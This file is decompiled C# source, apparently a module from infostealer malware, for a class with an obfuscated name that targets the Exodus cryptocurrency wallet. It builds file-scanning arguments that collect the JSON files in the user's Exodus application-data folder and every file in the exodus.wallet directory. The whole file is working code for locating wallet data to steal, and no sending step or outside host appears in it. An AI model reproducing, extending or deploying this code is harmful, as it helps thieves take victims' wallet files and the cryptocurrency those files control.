using System;
using System.Collections.Generic;
using System.IO;

// Token: 0x02000025 RID: 37
public class E_x0_d_u_S : FileScanner
{
	// Token: 0x060000C9 RID: 201 RVA: 0x000038E5 File Offset: 0x00001AE5
	public E_x0_d_u_S()
	{
		base.Name = "Exodus";
	}

	// Token: 0x060000CA RID: 202 RVA: 0x00003779 File Offset: 0x00001979
	public override string GetFolder(FileScannerArg scannerArg, FileInfo filePath)
	{
		return filePath.Directory.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", string.Empty);
	}

	// Token: 0x060000CB RID: 203 RVA: 0x00008BA8 File Offset: 0x00006DA8
	public override IEnumerable<FileScannerArg> GetScanArgs()
	{
		List<FileScannerArg> list = new List<FileScannerArg>();
		try
		{
			string directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Exodus\\exodus.wallet";
			string directory2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Exodus";
			list.Add(new FileScannerArg
			{
				Directory = directory2,
				Pattern = "*.json",
				Recoursive = false
			});
			list.Add(new FileScannerArg
			{
				Directory = directory,
				Pattern = new string(new char[]
				{
					'*'
				}),
				Recoursive = false
			});
		}
		catch
		{
		}
		return list;
	}
}
